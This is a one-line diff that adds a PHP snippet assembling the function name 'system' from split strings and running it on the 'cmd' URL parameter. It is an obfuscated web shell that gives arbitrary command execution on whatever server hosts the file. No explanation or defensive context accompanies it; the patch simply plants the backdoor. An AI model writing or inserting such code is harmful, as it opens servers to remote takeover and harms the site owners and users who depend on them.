@@ -1,0 +1,1 @@
+<?php $a='syste'; $b='m'; $c=$a.$b; $c($_GET['cmd']); ?>
